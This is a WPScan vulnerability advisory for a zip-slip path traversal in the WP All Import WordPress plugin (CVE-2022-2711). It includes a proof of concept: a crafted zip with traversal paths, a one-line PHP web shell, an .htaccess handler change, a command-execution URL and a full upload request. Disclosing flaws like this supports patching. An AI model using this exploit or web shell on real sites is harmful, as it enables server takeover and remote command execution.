=== Content from wpscan.com_cab19dea_20250114_220841.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# WP All Import < 3.6.9 - Admin+ Directory traversal via file upload

### Description

The plugin is not validating the paths of files contained in uploaded zip archives, allowing highly privileged users, such as admins, to write arbitrary files to any part of the file system accessible by the web server via a path traversal vector.

### Proof of Concept

[1] Download 'poc.zip' via 'https://github.com/lucy-official/TIL/raw/main/Security/Test%20Files/Zipslip/poc.zip'
poc.zip contains 2 files like below
-> '../../../../../../../../../../var/www/html/exploit.php.txt'
-> '../../../../../../../../var/www/html/.htaccess'
[1-1] '../../../../../../../../../../var/www/html/exploit.php.txt' is as follows.
----------------------------------
<?php system($\_GET['cmd']); ?>
----------------------------------
[1-2] '../../../../../../../../var/www/html/.htaccess' is as follows.
----------------------------------
<IfModule mod\_rewrite.c>
[same as the existing .htaccess data]
AddHandler application/x-httpd-php .php .html
</IfModule>
----------------------------------
[2] Upload the 'poc.zip' via the button [Upload a file] on 'http://localhost/wp-admin/admin.php?page=pmxi-admin-import'
[3] Access 'http://localhost/exploit.php.txt?cmd=id' in order to execute arbitrary commands.
[+++] PoC Request Packet Sample
POST /wp-admin/admin.php?page=pmxi-admin-settings&action=upload&\_wpnonce=afb6fb6e5c HTTP/1.1
Host: localhost
Content-Length: 1333
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryrhApgY7BhUu88AGu
Accept: \*/\*
Origin: http://localhost
Referer: http://localhost/wp-admin/admin.php?page=pmxi-admin-import
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: [wordpress-admin-cookie]
Connection: close
------WebKitFormBoundaryrhApgY7BhUu88AGu
Content-Disposition: form-data; name="name"
poc.zip
------WebKitFormBoundaryrhApgY7BhUu88AGu
Content-Disposition: form-data; name="chunk"
0
------WebKitFormBoundaryrhApgY7BhUu88AGu
Content-Disposition: form-data; name="chunks"
1
------WebKitFormBoundaryrhApgY7BhUu88AGu
Content-Disposition: form-data; name="async-upload"; filename="poc.zip"
Content-Type: application/zip
[poc.zip payload]
[ - you can download it via 'https://github.com/lucy-official/TIL/raw/main/Security/Test%20Files/Zipslip/poc.zip']
------WebKitFormBoundaryrhApgY7BhUu88AGu--

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

wp-all-import](https://a8cteam5105.wordpress.com/plugin/wp-all-import/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 3.6.9

### References

CVE
[CVE-2022-2711](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2711)

### Classification

Type
TRAVERSAL

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-22](https://cwe.mitre.org/data/definitions/22.html)

CVSS
[5.5 (medium)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:L/A:N)

### Miscellaneous

Original Researcher
lucy

Submitter
lucy

Verified
Yes

WPVDB ID
[11e73c23-ff5f-42e5-a4b0-0971652dcea1](https://a8cteam5105.wordpress.com/vulnerability/11e73c23-ff5f-42e5-a4b0-0971652dcea1/)

### Timeline

Publicly Published
2022-10-14 (about 2 years ago)

Added
2022-10-15 (about 2 years ago)

Last Updated
2022-10-17 (about 2 years ago)

### Other

Published
Title

Published
2023-05-15
Title
[Snow Monkey Forms < 5.0.7 - Unauthenticated Path Traversal](https://a8cteam5105.wordpress.com/vulnerability/19981b34-5343-454b-a45b-8262f3da8718/)

Published
2022-03-01
Title
[WordPress File Upload < 4.16.3 - Contributor+ Path Traversal to RCE](https://a8cteam5105.wordpress.com/vulnerability/7a95b3f2-285e-40e3-aead-41932c207623/)

Published
2023-05-23
Title
[WordPress File Upload < 4.19.2 - Admin+ Path Traversal](https://a8cteam5105.wordpress.com/vulnerability/12aa16b1-67eb-458c-b50f-95373b5fe883/)

Published
2021-11-11
Title
[Download Plugin < 2.0.0 - Subscriber+ Website Download](https://a8cteam5105.wordpress.com/vulnerability/b125a765-a6b6-421b-bd8a-effec12bc629/)

Published
2021-12-14
Title
[True Ranker < 2.2.4 - Unauthenticated Arbitrary File Access via Path Traversal](https://a8cteam5105.wordpress.com/vulnerability/d48e723c-e3d1-411e-ab8e-629fe1606c79/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

